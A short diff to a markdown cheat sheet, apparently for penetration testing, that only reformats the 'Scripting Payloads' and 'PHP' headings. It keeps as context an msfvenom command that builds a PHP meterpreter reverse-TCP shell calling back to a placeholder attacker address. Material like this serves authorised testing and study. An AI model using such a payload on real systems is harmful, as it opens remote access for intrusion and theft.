@@ -20,9 +20,8 @@ Once the required values are completed the following command will execute your h
 <br/>
 <br/>
 
-#### ./ Scripting Payloads
-
-<b>PHP<b/>
+## ./ Scripting Payloads
+PHP
 
 ```bash
 msfvenom -p php/meterpreter_reverse_tcp lhost=<your-IP-address> lport=<your-port-address> -o shell.php
